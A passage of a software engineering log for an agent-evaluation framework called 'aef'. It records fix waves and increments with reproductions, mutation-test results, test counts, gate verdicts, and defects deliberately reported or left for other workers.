      one encoding), agent_id and clock_values. Worker rebuilds services per
      scenario, carrying memory+knowledge over so one worker still serves the
      corpus. Clock cursor is independent of the parent's and says so.
F4  NOT changed. ADR 0113 Consequences + `loop score --help` carry the numbers.
F7  KeptBranchCheckedOutError before anything is created or gated. update-ref
      stays: merge/reset on the checked-out branch is the loop touching a
      person's working tree, which ADR 0114 refuses.
F11 _scenarios_for_graph: match config.graph_id when any scenario does; gate
      all when the corpus records ONE graph (--graph-id is the archive key, a
      different namespace from graph.id); CorpusGraphMismatchError when it
      records several and none match. G2 gets the same filtered scenarios —
      it reports anything absent from `precomputed` as missing.
sus aef/cli/loop.py cmd_score builds the policy from --config, like aef run.
```

**Measure (after).**

```
F1  run 0 [] , run 1 [] , run 2 ['failure:work']   (two distinct runs = knowledge)
F2  run 0 retrieved []                              (OTHER-TENANT gone)
F3  in-process 1.0 / isolated 1.0, errors 0 both
F7  KeptBranchCheckedOutError, fake cycle called 0 times, loop/kept == main,
      git status --porcelain ''
F11 graph_id='demo_agent' -> ['demo-1','demo-2'];  'default' -> REFUSED by name
sus aef loop score --config 1.0000 ; without --config 0.0000 (deny-by-default)
```

**Mutations** (perturb the production value, run, see the named test fail,
revert; no `MUTATION` marker survives in `aef/`):

```
M1  aef run's consolidate-at-start removed        1 failed
M2  aef run passes agent_id=None                  1 failed
M3/M4 configure frame sends policy/agent_id None  2 failed
M5  worker ignores the frame's policy             1 failed
M6  the kept-branch refusal removed               2 failed
M7  the graph_id filter computed and discarded    1 failed
M8  a mixed corpus falls back to all scenarios    1 failed
M9  cmd_score builds no policy from --config      1 failed
```

Every fix also ships a CONTROL test — no-policy still denies in the worker,
the loop still runs from any other branch, a single-graph corpus still gates
on all of it, `loop score` without `--config` is still deny-by-default —
because a guard that also blocks the ordinary case is an outage, not a guard.

```
pytest -q          1797 passed (from 1783 at 705543d; +14, none removed)
mypy aef examples  127 files clean
ruff check / format   clean
calls made: 0 (no live model calls in this wave)
```

Flaky, recorded not papered over: `test_a_timed_out_container_is_actually_dead`
and `test_closing_the_session_leaves_no_container_running` each failed once
across three full runs and passed in isolation and on the third full run. Both
assert on the machine-global `docker ps` set, so a concurrent worker's
container on the same daemon reads as a leak. Environmental, pre-existing,
untouched by this diff.

**Verdict.** No rubric score moves — nothing new was built. What changes is
that **dimension 2's evidence is now true of the path the CLI runs**: ADR
0118's "A1 is closed on the way" was cited for 15→17, and until this wave the
run it describes did not happen when `aef run` ran it — `retrieved_signatures`
was `[]` in every CLI run and the helpful/harmful tally had no producer there.
The claim was overstated; it is now supported. Dimension 6's G3 evidence gains
the ability to tell two candidates apart on policy-governed behaviour at all,
which no measurement in this program could see, because `agents/demo` consults
no policy and a uniform zero looks like a fair comparison.

**Deliberately left.** `budget_ms` recorded and judged on one path (a design
change, not a threshold). A parity test comparing the parent's `Services`
against the WORKER's — `test_service_parity.py` compares `aef run` against the
in-process gate path and nothing compares either against the worker, so F3's
completeness rests on inspection rather than a test that enumerates. The
`shadow.py` `NodeWorkerSession`, which sends no configure frame and therefore
still runs deny-by-default (safe, but a fourth construction of the same list).

---

## I0 — The scoreboard is under test (2026-09-04)

**Branch:** `improve/i0-rubric-arithmetic`, off `94f5575`. **Rubric claim:
none** — this corrects an addition, it measures no capability.

**Reproduce (RUN).** Summed the rubric's latest row per dimension, carrying
the two dimensions that have never moved (4 and 8) from the baseline: **85**
against a stated **84**. Walked back: the baseline's own rows sum to **51**
against a stated **50**. Every total since did `previous + delta` from the
wrong base. The guard test against the uncorrected file: 3 failed, 3 passed.

**Expectation.** Correct both totals with a note that no row moves; add a
test that recomputes the heading from the rows and encodes the table's real
shape (prepend-ordered; unmoved dimensions carry from baseline).

**Measurement.**

```
guard vs uncorrected file      3 failed, 3 passed
guard vs corrected file        6 passed
mutations (each -> fails, reverted):
  M1 heading one point high              2 failed
  M2 dimension scores above its weight   3 failed
  M3 dimension that is not weighted      4 failed
  M4 baseline restored to its old error  1 failed
pytest -q          1820 passed (from 1814; +6, none removed)
mypy aef examples  127 files clean
ruff check / format   clean
```

**Verdict.** Score is **85**, not 84 — an addition error, not a new
capability, and no dimension's evidence changes. 90 is five points away:
I12 (+2), live noise floor (+1), judge A/B re-run (+1), Codex smoke (+1).

**Deliberately left.** The totals quoted in earlier ADRs, log entries and
`docs/research/above-90-2026-09-04.md` stand as written: they are dated
records of what was believed, and rewriting them would erase the error
rather than record it. ADR 0127 is the correction and the rubric points
at it.

---

## I15 — The Codex path, measured (2026-09-04)

**Branch:** `improve/i15-codex-verified`, off `61a43e1`.
**Rubric claim:** dimension 8, +1. Total before: 85.

**Reproduce (RUN).** `codex exec --ephemeral --skip-git-repo-check -s
read-only --json -o cx.txt "Reply with the single word OK"` → exit 1,
`failed to load models cache: unknown variant 'max', expected one of none,
minimal, low, medium, high, xhigh`. Installed `@openai/codex@0.135.0`
(2026-05-29); latest 0.153.2. The CLI predated a reasoning level its own
server advertises, so `CodexProvider` had never run and ADR 0112's parsing
was still the hypothesis it declared itself to be.

**Expectation.** Upgrade, run the smoke, then the adapter. Expected to find
at least one parsing detail wrong — the adapter was written from `--help`
with no run to check it against.

**Measurement.**

```
npm i -g @openai/codex@latest        0.135.0 -> 0.153.2 (owner-approved)
smoke                                 exit 0, "OK", usage in 19,253 / out 15
CodexProvider.complete(), UNMODIFIED, first live attempt:
  content 'OK'  model 'gpt-5.5'  stop 'end_turn'  in=19975 out=26
mutations against the real CLI (each -> fails, reverted):
  M1 usage scan reports zero        1 failed
  M2 reply not read from the file   1 failed
tests/providers                       48 passed, 1 skipped (live test opt-in)
pytest -q          1821 passed (from 1820; +1, none removed)
mypy aef examples  127 files clean
ruff check / format   clean
```

**Verdict.** The prediction was wrong: every line of the parsing matched on
the first run. Recorded as wrong — it was a hypothesis for four days and
only this run separated it from a wrong one. Dimension 8: 4 → **5**.
Total: **85 → 86**.

**Deliberately left.** Codex spends ~19–20k input tokens on a one-word
reply — the same overhead class ADR 0126 cut from ~211k to ~4.7k on the
Claude path — and no Codex equivalent of `--safe-mode` has been looked for.
An MCP `HTTP 405` appears on stderr of every successful run. Both recorded
in ADR 0131, neither acted on.

---

## K2 — A corpus on day one (2026-09-04)

**Branch:** `improve/k2-bootstrap`, off `4872088`.
**Rubric claim:** none. This is `READY_LOOP.md`, not the rubric — the score
does not move. It makes definition-of-done statement **1** ("a raw-SDK repo
goes from `git clone` to a gated candidate without hand-writing a node or a
scenario") true on its *scenario* half; the node half is K1's.

**Reproduce (RUN).** Fresh repo, one 8-line raw-SDK agent, `aef adopt` then
`aef migrate`:

```
ls corpus/                        -> README.md, and nothing else
aef loop doctor ... --corpus corpus
  [--] corpus + tripwire       0 scenario(s), 0 tripwire(s)
aef loop record ... --scenario-id s1 --objective "an ordinary task"
  -> passed=True                  (the happy path is all you can reach)
aef loop record ... --scenario-id s2 --objective "a hard task" \
    --working-memory '{"difficulty": 9, "quality_needed": 9}'
  -> passed=False                 (a hand-written JSON blob, per scenario)
```

**Expectation, before starting.** That bootstrap alone would turn the corpus
obligation green. Wrong: `preflight`'s first obligation is
`scenarios AND tripwires`, and rule 2 forbids bootstrap from labelling one.
So the design changed — bootstrap generates the `aef loop record --expected
must_fail` line with the objective and working memory already filled in, and
the owner runs it. One pasted line, no hand-written scenario, and the label
stays the owner's (ADR 0060).

**Change.** `aef/harness/bootstrap.py` (new), `aef loop bootstrap` in
`aef/cli/loop.py`, and `recorder.refuse_existing_ids` — the no-overwrite
rule lifted out of `record_to_corpus` so bootstrap can apply it to a whole
batch *before* running anything, one implementation and one wording.

**Measurement.**

```
aef loop doctor  BEFORE            [--] corpus + tripwire  0 scenario(s), 0 tripwire(s)
aef loop bootstrap agents.demo.graph --corpus corpus --inputs inputs.json
                                   recorded 4 scenario(s) in the train split
                                   2 of 4 recorded run(s) FAILED.   exit=0
aef loop doctor  AFTER BOOTSTRAP   [--] corpus + tripwire  4 scenario(s), 0 tripwire(s)
<the printed record command, pasted verbatim>
aef loop doctor  AFTER             [OK] corpus + tripwire  5 scenario(s), 1 tripwire(s)
aef loop score agents.demo.graph:build_graph --corpus corpus
                                   train n=4 mean=0.5000  validation n=1 mean=0.0000

re-run bootstrap over its own output -> exit 1, "already exist", corpus unchanged
an "expected" key in inputs.json     -> exit 1, refused, naming ADR 0060

mutations (production value perturbed, test run, reverted):
  M1 writes a non-train split          2 failed
  M2 labels expected                  11 failed
  M3 overwrites an existing id         2 failed
  M4 failure count not reported        2 failed
  M5 zero-failure warning removed      1 failed
  M6 one shared Services per batch     1 failed
  M7 a refused key is ignored          2 failed
  M8 the halt check removed            1 failed
pytest -q          1847 passed, 1 skipped (from 1820; +27, none removed)
mypy aef examples  128 files clean
ruff check / format   clean
```

**Verdict.** The measurement uses this repo's `agents/demo`, not the
adoptee's own graph, and the reason is a second measurement rather than
convenience: bootstrapping `aef_migrated` records **0 of 4** and exits 1,
because the migrated node calls the adopter's function, which builds its own
`anthropic.Anthropic()`, and the run raises before producing a trace. That
is K1's defect seen from the corpus side.

**A wrong prediction, recorded.** The first implementation printed the
zero-failure line for that run — *"0 of 0 recorded run(s) failed. A corpus
where everything passes cannot demonstrate an improvement"* — when nothing
had passed and nothing had run. A green light for something that did not
hold, written by the increment whose subject is that shape. Fixed, and the
test asserts the everything-passed sentence is absent.

**One NEW defect, found by seam-hunting this diff before it shipped.**
`cmd_harvest` checks the kill switch before writing to `corpus/` (ADR 0069);
`cmd_bootstrap`, writing to the same directory for the same consumers, did
not. Fixed in the same increment, with an optional `--state` (day one has no
loop state dir yet) and mutation M8.

**Deliberately left.** No `aef loop label` command: marking an existing
scenario `must_fail` in place would be a second way to write an owner claim,
and re-recording it under a new id keeps the recorder's refusal ("a task the
agent just completed cannot be a tripwire") on the path. `checks` and
`budget_ms` are per-input; `agent_id` is per-invocation, and the first real
inputs file may want it per-input.

---

## K1 — An adopted repo's model call must be visible to the harness (2026-09-04)

**Branch:** `improve/k1-provider-visible`, off `4872088`.
**Rubric claim: none.** The ready loop's definition of done is four
command-backed statements, not points. K1 makes **statement 2** true ("every
model call in an adopted repo is visible to the harness, or the tooling says
loudly that it is not") and **statement 3** true of `aef loop doctor` ("green
only when those things are true"). Statement 1 needs K2, statement 4 is the
owner's.

**Reproduce (RUN), all four, on the adopted+migrated repo.**

```
1. aef doctor --dir <adoptee>          EXIT 0, green
                                       2 advisories, neither about the model call
2. node run against a counting provider, fake anthropic installed:
     vendor SDK reached      ['anthropic.Anthropic()', 'client.messages.create']
     Services.model_provider 0 call(s)
3. record_run -> 0 RecordedCall(s); replay on_miss="fail", live_provider=None:
     score 0.5 and a LIVE vendor call inside the gate
     cassette {'hits': 0, 'misses': 0}   <- not even a miss; it was never asked
     with the SDK removed: score 0.0, TypeError "Could not resolve authentication"
4. aef loop doctor  -> five obligations, none about this
   aef migrate      -> "1 wrapped, 0 skipped", nothing about the bypass
   aef doctor       -> above
```

The disjunction `READY_LOOP.md` predicted, confirmed exactly: **a live call
inside a gate told not to make one, or 0.**

**Expectation.** Lift `tests/test_vendor_isolation.py`'s scanner into `aef/`,
add a preflight obligation, and teach `migrate` the routed form. Expected the
routed form to be the easy half and the falsification clause to be the
argument. It was the reverse — the decision rule fell out of what
`ModelProvider.complete()` *is* (one shot, non-streaming, single-backend), so
every blocker is a specific AST feature naming what routing would drop. What
took the time was that neither generated form had ever been linted or executed.

**Change.** `aef/harness/vendor_scan.py` (new): the scanner and ONE list;
`tests/test_vendor_isolation.py` imports it back. `preflight()` gains a sixth
obligation, **model calls visible**, walking imports reachable from the
configured graph. `aef doctor` gains the same as an advisory. `aef migrate`
emits a routed node when the function is nothing but the call, and otherwise
today's wrapper plus a docstring warning naming the specific thing routing
would have dropped — the report says which and why for every site.

**Measurement.**

```
after routing, same four questions:
  Services.model_provider  1 call(s)      vendor SDK reached  []
  recorded scenario        1 RecordedCall(s)
  replay, anthropic DELETED from sys.modules, no credential:
      score 0.5, cassette {'hits': 1, 'misses': 0}, live calls []
  aef loop doctor  [OK] model calls visible  1 reachable module(s), none imports a model SDK

mutations (each -> fails, reverted; git diff --exit-code = 0):
  M1 vendor scan reports nothing              3 failed
  M2 reachability stops at the entry file     1 failed
  M3 everything declared routable             1 failed
  M4 try/except no longer blocks routing      2 failed
  M5 routed node bypasses require_...()       1 failed
  M6 _skip tests the ABSOLUTE path again      1 failed
  M7 cohere drops out of the vendor list      1 failed
  M8 scanner ignores nested imports           3 failed

pytest -q          1847 passed, 1 skipped (+27, none removed)
mypy aef examples  128 files clean
ruff check .       clean
ruff format --check aef tests examples   clean
calls made: 0 (no live model call anywhere in this increment)
```

**Verdict.** The green light is gone: `aef loop doctor` refuses, `aef doctor`
warns, and `aef migrate` states its choice. The measured adoptee routes, and
its gate now replays without the vendor SDK installed or any credential — which
is what ADR 0112's harness login was for and what nothing had ever exercised
through an adopted repo.

**Three findings the work turned up, none of them the increment.**

1. The subset test `MODEL_SDK_ROOTS <= VENDOR_TOP_LEVEL_MODULES` **failed on
   its first run**: `cohere` had been in `migrate.py`'s tuple and never in the
   constraint #3 list, so `import cohere` in `aef/kernel/` would not have been
   caught. The drift the test was written to prevent was already there.
2. `migrate._skip` tested the **absolute** path, so any repo living under a
   dot-directory — `~/.local/src/app`, a git worktree under `.claude/`, a
   checkout in `.build/` — had every file skipped and was reported
   `scanned 0 Python file(s) ... 0 call site(s)`, exit 0. Reproduced with two
   identical repos differing only in location: 1 site vs 0. Fixed here because
   K1's own reproduction runs in a worktree under `.claude/`, and it is the
   same defect class as K1 itself — success reported for a question declined.
3. The generated module had **never passed the repo's own ruff**: two `E501`s
   and an `F401` in the empty form, which imported `Any` and never used it. A
   test now runs ruff on all three forms and another executes both node forms.

**Deliberately left.** The routable predicate is designed against one toy and
seven hand-written counter-shapes; a retry *decorator* is invisible to it,
because it reads only the function body, and would be routed and lost. The
reachability walk resolves absolute imports against the repo root and does not
follow `sys.path` edits, namespace packages, src layouts rooted elsewhere or
dynamic `importlib` — it can under-report, which is the safe direction for a
gate, and is stated in the ADR rather than fixed. `aef doctor`'s check is
advisory and only fires when `aef_migrated.py` exists; a hand-written graph
that builds its own client is caught by `aef loop doctor` and not by
`aef doctor`. And nothing here has run against a repo nobody wrote to be
scanned, which is K5's whole point.

---

## K3 — Prove an adopted repo can gate a candidate (2026-09-04)

**Branch:** `improve/k3-adopted-gate`, off `c2d14b1` (K1 + K2 merged).
**Rubric claim: none.** `READY_LOOP.md`'s definition of done is four
command-backed statements. K3 makes statement **1** answerable — and the
answer is *"not yet, and here is exactly what is missing"* — and sharpens
statement **3**: every obligation green is **necessary and not sufficient**
for a candidate, because the proposer's own inputs (a tunable constant,
durable failure memory) are not obligations at all.

**Reproduce (RUN).** `tests/cli/test_adoption_sequence.py` drove a fresh
adopted repo to five green obligations and a blessed baseline and stopped.
Its one `aef loop cycle` asserted `"ledger verified" in cycle.stdout` — which
the cycle prints *before* it has done anything — and passed no `--entrypoint`,
so G2/G3 would have refused for lack of evidence even had a candidate
existed. `grep -rn "run.proposed" tests/` finds four call sites and all of
them are in-process `cycle()` runs against `agents/flaky` and `agents/demo`,
fixtures this repo wrote. Running the whole documented sequence on a real
adopted+migrated raw-SDK repo:

```
aef migrate --dir .            1 routed through Services.model_provider
aef loop bootstrap aef_migrated   -> ModelProviderError: cassette miss ...
                                     no live provider to fall through to   exit=1
aef loop bless --agent-path aef_migrated.py   -> "blessed aef_migrated.py"  exit=0
aef loop cycle ... --entrypoint aef_migrated:build_graph
    ledger verified: 1 entr(ies)
    no admissible failure memory: no candidate this cycle                  exit=0
```

**Exit 0, having done nothing** — READY_LOOP's "if the cycle cannot produce a
candidate, that is the finding" clause, confirmed.

**The minimum, measured by removal.** One thing taken out of a working
sequence at a time, each run, each quoted:

```
no module-level numeric constant  the proposer produced nothing from the
                                  available evidence                        exit=0
no route to reflect (returns END) no admissible failure memory              exit=0
no failing aef run --memory       no admissible failure memory              exit=0
graph at the repo root            gated: reject — G0 rejected it: candidate
                                  touches paths outside Zone A              exit=1
```

Plus: **a model-calling graph cannot get a first corpus without a
credential.** The cassette the gates replay from does not exist until
something makes the call once, so bootstrap on K1's routed node exits 1.
That is a cost, not a gap to document around.

**Expectation, and it was wrong.** I expected the blocker to be recorded
failure memory — READY_LOOP's guess and mine. Necessary, not sufficient:
**Zone A placement** mattered equally and was on nobody's list. `aef migrate`
writes `aef_migrated.py` to the repo root, which is the one place in an
adopted repo the loop is structurally forbidden to operate, and nothing says
so. Two of the four blockers are properties of *where and how the code is
written*, not of what the adopter has recorded.

**Change.** `tests/cli/test_adoption_sequence.py`:
`test_an_adopted_repo_gates_a_candidate_end_to_end` (slow — 35 scenario
executions; **no credential, zero model calls**) runs adopt → migrate →
*bootstrap the migrated graph and watch it refuse* → the minimum, hand-written
with the four measured refusals in its comment → bootstrap → **the tripwire
line bootstrap printed, `shlex.split` and run verbatim** → a failing
`aef run --memory` → bless → doctor → cycle. It asserts against
`ledger.jsonl`, not the CLI's summary: a printed string proves a string was
printed. `aef/cli/adopt_loop.py`: the measured minimum now **leads** the
generated `LOOP.md`, because each item's failure mode is exit 0, which reads
as success — an obligation whose failure mode is a green light cannot live in
step five. A second test pins that ordering.

**Measurement.**

```
ledger.jsonl, gated entry:
  evidence  7 corpus pass(es) (35 scenario execution(s)): 1 candidate +
            1 incumbent + 5 random control(s); gating all 5 gated scenario(s)
  G0 pass   1 file(s), 2 line(s), all Zone A
  G1 pass   1 build command(s) succeeded against the merged workspace
  G4 pass   no owner-only safety metadata declared by the candidate
  G5 pass   drift 0.024/0.500 from the blessed baseline
  G2 pass   5 scenario(s) re-executed; every previously-passing one still passes
  G3 fail   candidate does not beat the p95 of the random control cohort
  grounded_in  <record id> (memory): 1 error(s) recorded; errors[0]: gave up

mutations (production value perturbed, run, reverted; per-file
`git diff --exit-code` clean; 6 tests in the file):
  M1 the proposer returns nothing                  1 failed
  M2 G3 built with verdict=None (no-cohort)        1 failed
  M3 the cohort build raises                       1 failed
  M4 aef run --memory uses an in-memory store      1 failed
  M5 migrate never emits the routed form           1 failed
  M6 the LOOP.md minimum moved below the six       1 failed
  M7 the printed tripwire line drops --expected    1 failed

pytest -q          1877 passed, 1 skipped (collected 1876 -> 1878; +2, none removed)
mypy aef examples  129 files clean
ruff check .       clean
ruff format --check aef tests examples   239 files already formatted
calls made: 0
```

**Verdict.** An adopted repo *can* gate a candidate, and the verdict is a
**rejection** — G3 on a real cohort comparison, which is the gate working.
The test pins the *absence* of G3's `no null-hypothesis control cohort`
refusal rather than pinning `pass`, because a test that demanded an
acceptance could be satisfied by weakening G3.

**Two defects found, REPORTED not fixed** (both outside K3's file scope):

1. **`aef loop bless` names a file it did not archive.** `bless ...
   --agent-path aef_migrated.py` printed `blessed aef_migrated.py as baseline
   v1` and the archive held exactly one file: `agents/README.md`. It checks
   `path_exists_at(ref, agent_path)`, then archives the Zone A tree — two
   different questions, and the message names the first while doing the
   second. The `blessed baseline` obligation goes green on evidence unrelated
   to the agent. (`aef/harness/preflight.py:bless`, `aef/cli/loop.py:cmd_bless`.)
2. **`aef adopt` writes no `.gitignore`, and committed bytecode is charged as
   drift.** An ordinary `git add -A` commits `agents/**/__pycache__/*.pyc`
   into **Zone A**; those files did not exist when the baseline was blessed,
   so G5 charges them — measured **0.4675 of a 0.500 budget** for a one-line
   candidate against **0.0238** without them, a 20x over-report that would
   reject the adopter's second candidate for drift it did not cause. ADR
   0074 made both sides read from git; nothing stops an adopting repo from
   having the bytecode *in* git. The new fixture writes the `.gitignore`
   itself, with the numbers in a comment, and `LOOP.md` now says to add one
   before blessing. (`aef/cli/adopt.py`.)

**Deliberately left.** The measured minimum is the minimum for **one agent
shape** — one work node, two integer constants, a reflect node. A graph that
fails by raising lands in `errored` rather than `failed` (ADR 0138 already
flags it) and would need `add_bounded_retry` to apply; a graph with one small
integer constant may not yield five distinct control mutations and would fail
cohort generation with a message none of this quotes. Neither was run. And
the adoptee is still a fixture this repo authored — smaller and less helpful
than before, but authored. K5 is the only thing that closes that.

---

## Fix wave C — the routed form dropped the request, not just the retries (ADR 0140)

A seam hunt over ADR 0137's diff, hours after it merged, found four defects in
the **routed** node form `aef migrate` had just started generating. Every one
is the same mistake: the generator routed a call it should have refused.

**All four reproduced by running, before anything changed.**

**R1 — the request itself.** ADR 0137's falsification clause lists retries,
loops, `try`, streams, guessed model ids and transitive wrappers. Every item
is about **control flow**. `CompletionRequest` has five fields, and nothing in
the predicate had ever looked at the keywords the call passes. A claims
adjuster —

```python
client.messages.create(
    model="claude-sonnet-4-6", max_tokens=8192,
    system="You are a claims adjuster. NEVER approve a payout above $5,000.",
    temperature=0.0, tools=[{"name": "lookup_policy"}], stop_sequences=["</done>"],
    messages=[{"role": "user", "content": prompt}],
)
```

— was judged `ROUTED`, and the node it wrote carried `messages/model/max_tokens`
and a docstring reading *"there is nothing here for routing to lose."* The
payout ceiling and the tool grant were gone.

The routable keyword set now comes from `dataclasses.fields(CompletionRequest)`
plus `messages`. A second hardcoded list here is ADR 0091's drift and is
*exactly what produced this defect* — the predicate had its own idea of what a
request contains and it was never the request type's. Anything else refuses and
names itself; `system=` gets its own reason. **Expressible is not sufficient**:
`max_tokens=MAX` used to route as *no* `max_tokens`, silently substituting the
request type's default of 16000, so a non-literal value refuses too.

**A correction found by checking the finding.** The seam hunt said a system
prompt is "not expressible at all". It is *representable*: `ProviderMessage`
has a `system` role and both the Anthropic and harness adapters fold it into
the vendor's system parameter. What is missing is a `system` **field**, and any
basis for deciding how a literal system prompt pairs with the objective this
node substitutes for the call's own message list. The refusal stands; its
reason was rewritten mid-fix to say the narrower true thing, and carrying a
lone `system=` as a synthesised system-role message is recorded in ADR 0140 as
a follow-up rather than done.

**R2 — three shapes, two of them predicted in ADR 0137's own Confidence
section and shipped anyway.** A bare `@retry` is an `ast.Name`, not an
`ast.Call`, so it left nothing in `decorator_list` for the "body also calls
`retry()`" rule to trip over — that rule caught the *called* form by accident
and the bare form not at all. `**kwargs` at the SDK call is an `ast.keyword`
with `arg=None`, filtered out before any keyword was read, so a caller passing
`stream=True` at runtime defeated the stream check without touching the code
migrate read. And `anthropic.Anthropic(base_url="https://llm-gateway.corp/v1",
timeout=120.0, max_retries=8)` — the corporate-gateway shape — routed, sending
the call to a different endpoint, on a different credential, billed to a
different account. Now: **any decorator at all**, **any `*args`/`**kwargs` at
the call**, **any argument to the client constructor** → unrouted, each with
its own reason and its own test. A predicted defect that ships is a defect.

**R10 — `--force` discarded adopter edits, and the doctor recommends it.** The
"model calls visible" obligation prints `aef migrate --dir . --force` as its
fix. Hand-edit the node, run that line: edits gone, no backup, no diff, no
warning, exit 0 — three lines below a comment reading *"A generated file the
operator has since edited is the expensive thing to lose."* `--force` now
renders first and compares; identical writes no `.bak` (noise), different
writes `aef_migrated.py.bak` — `.bak.1`, `.bak.2`, … so a second `--force`
cannot destroy the first backup — and `report()` says so on stdout.

**R11 — every generated node declared itself PURE.** `render()` emitted
`Node(...)` with no `side_effects`. `add_bounded_retry`'s guard reads the
declaration from source and its own comment says it *"requires the declaration
rather than assuming it"* — but the check is `if effects is not None`, so an
**absent** declaration skips it. The loop could wrap a live, billed, routed
model call in a 3-attempt retry with nobody asked. Both forms now declare
`side_effects=SideEffect.EXTERNAL_CALL` with a generated `idempotency_key_fn`.

The alternative — emit the key as a `TODO` so `Node.__post_init__` raises — was
rejected and the reason is recorded: `build_graph()` would raise at import, and
running the generated graph *is* ADR 0137's evidence chain (provider call →
`RecordedCall` → credential-free replay) and K3's premise. The shape generated
is the one `agents/summary/graph.py`'s `draft` node already uses for this
repo's own live model call. The generated `_idempotency_key` factory's
docstring states what the key does not buy: `ModelProvider.complete()` accepts
no idempotency key, so nothing dedupes on it and a retry is a second billed
call — the adopter reads that in their own file, with the declaration in front
of them.

**A new defect, found by the test written to prevent one.** A long-node-id ruff
case, added because the new `idempotency_key_fn=` line repeats the node id,
failed for three **pre-existing** reasons: with a realistic module path
(`src/services/llm/anthropic_backend_client.py` +
`call_llm_with_backend_and_budget`) the generated docstring's qualified-name
lines and `return StateDelta(working_memory={"<node id>": ...})` were already
116, 125 and 138 characters, in both forms. ADR 0137 added a ruff-the-output
test and ran it only on short names, so the E501s it records finding were not
all of them. Reflowed, and the long case is now asserted.

**Ten mutations, ten caught**, each reverted byte-for-byte
(`git diff --exit-code` = 0): the derived keyword set replaced by a literal;
each of the four new refusals disabled; the non-literal check bypassed; the
backup skipped; the `side_effects` declaration removed; the key fn removed;
`EXTERNAL_CALL` downgraded to `IO`.

**Green bar.**

```
pytest -q          1891 passed, 1 skipped   (+16 tests in tests/cli/test_migrate.py, none removed)
mypy aef examples  129 files clean
ruff check .       clean
ruff format --check aef tests examples   239 files already formatted
calls made: 0 — no live model call anywhere in this wave
```

**No rubric score moves.** This is a correctness-and-safety fix to something
that shipped hours earlier, not an increment.

**Left for the orchestrator.** `aef/harness/preflight.py` belongs to another
worker and its fix string for the "model calls visible" obligation still prints
a bare `aef migrate --dir . --force`. It should say that `--force` preserves an
edited file as `.bak` — the behaviour now exists, and the surface that
recommends the command is where an adopter reads about it.

**Left unfixed, deliberately.** `temperature` is a real field of
`CompletionRequest`, so a literal `temperature=0.0` is carried into the routed
request — and `AnthropicProvider` deliberately does not forward it, because
current Anthropic models reject sampling parameters with a 400. That is a gap
between the request type and one adapter, not between the call site and the
request type, and this predicate answers only the second question. Named in ADR
0140 rather than closed: closing it means either a per-adapter capability
declaration or excluding a real field by hand, and the second is the drift this
wave is about.

---

## Fix wave E — Zone A hygiene: the adopter pays for what `adopt` did not write (2026-09-04)

**ADR:** `docs/adr/0142-zone-a-hygiene-the-adopter-pays-for-what-adopt-did-not-write.md`
**No rubric dimension moves.** Two defects, both found by K3 (ADR 0139) while
proving an adopted repo can gate a candidate, both reported there rather than
fixed because they sat outside that increment's file scope.

**E1 — committed bytecode is charged as drift. REPRODUCED, then fixed.**
`aef adopt` wrote no `.gitignore`, so an ordinary `git add -A` on day one
commits `agents/**/__pycache__/*.pyc` into **Zone A**. The bytecode is created
*after* `aef loop bless` archives the baseline (by `bootstrap`, `aef run`,
`pytest` — anything that imports the agent) and committed *before* the cycle,
so it is on the candidate side only, and `structural_drift` charges every line.

K3's numbers re-derived rather than copied — the K3 adoption sequence driven
twice against a fresh `git init`, each arm ending in a real `aef loop cycle`
that wrote its own ledger:

```
WITHOUT .gitignore   3 .pyc tracked under agents/
                     G5: drift 0.468/0.500 from the blessed baseline
WITH .gitignore      0 .pyc tracked
                     G5: drift 0.024/0.500
```

and itemised by re-running `structural_drift` over the same archive and the
same candidate branch:

```
agents/mine/__pycache__/graph.cpython-313.pyc   differing 29 of 29
agents/mine/__pycache__/__init__...pyc          differing  3 of  3
agents/__pycache__/__init__...pyc               differing  3 of  3
agents/mine/graph.py                            differing  1 of 30
TOTAL 36/77 -> 0.4675324675   93.5% of budget, headroom 0.0325
(without the bytecode: 1/42 -> 0.0238095, headroom 0.4762)
```

**35 of the 36 differing lines are bytecode; 1 is the candidate.**
`_drift_exhausted_twice` halts the loop on two consecutive drift rejections,
so day one put an adopter two candidates from a halt for reasons that have
nothing to do with their agent. This is ADR 0074's defect from the other
side, and unreachable by that fix: 0074 made both sides read from git, which
cannot help when the bytecode is *in* git.

`run_adopt` now writes a `.gitignore` under the scaffold's never-overwrite
rule. **An existing one is skipped and reported, never appended to** —
silently adding a generated line to a tracked config the adopter owns is the
never-overwrite rule broken by another route — with the report landing in the
checklist `adopt` both prints and writes to `AEF_MIGRATION_CHECKLIST.md`,
naming the two patterns and the measured cost. Coverage is an exact match in
two families (`__pycache__/…`, `*.pyc`-shaped) because either alone suffices
on CPython 3 and nagging for an equivalent pattern is how generated advice
stops being read; a comment is not a rule. `corpus/` and `.github/workflows/`
are deliberately not ignored — Zone B is evidence read from git, and an
ignored corpus is an empty one.

After, same script unchanged: **0.468 → 0.024**, both arms identical.

**E2 — `aef migrate` writes to the one directory the loop cannot touch.
REPRODUCED; the half that is mine is fixed.** `run_migrate` hardcodes
`out = root / "aef_migrated.py"`; the repo root is Zone C. Reproduced through
the harness's own `read_candidate`/`inspect_candidate` on a real commit —
`allowed: False`, `aef_migrated.py: Zone C (core) — not under the agent root
'agents'` — and neither migrate's report nor **any** file `aef adopt`
generated said so: the strings `Zone A` and `agents/` appeared nowhere in
`CLAUDE.md`, `AGENTS.md` or `AEF_MIGRATION_CHECKLIST.md`, while the checklist
said "Convert each call site into a Node function".

`migrate.py` belongs to another worker this wave, so `adopt` now states the
constraint where the adopter meets it: a `## Where converted nodes have to
live` section in the generated CLAUDE.md/AGENTS.md and a
framework-independent checklist item, both interpolated from
`aef.harness.zones.DEFAULT_AGENT_ROOT` and cross-checked by test against the
directory `adopt` actually creates.

**Routed, not done here.** `aef/cli/migrate.py:run_migrate` needs an `--out`
threaded from `main._cmd_migrate`, defaulting to
`f"{DEFAULT_AGENT_ROOT}/migrated/graph.py"` (imported, never spelled out),
keeping the never-overwrite/`--force` rule; and `report()` should name the
zone of the path it wrote. Related and still open: `aef loop bless
--agent-path <a path outside Zone A>` succeeds while archiving a tree that
does not contain it (K3's other reported defect,
`aef/harness/preflight.py:bless`).

**Tests.** Eight new: seven in `tests/cli/test_adopt.py` (including
`test_the_generated_gitignore_actually_makes_git_ignore_zone_a_bytecode`,
which asks `git check-ignore` rather than matching a string, and
`test_gitignore_gaps_ignores_commented_out_patterns`, the detector's own
control) and one end-to-end in `tests/cli/test_pristine_adoption.py` on
**unmodified** adopt output, asserting through `bless`'s archive and the
gate's own `structural_drift`.

**`test_adopt.py`'s pins were updated deliberately**, and this line is the
record of it: the exact written-file set gains `.gitignore`, and
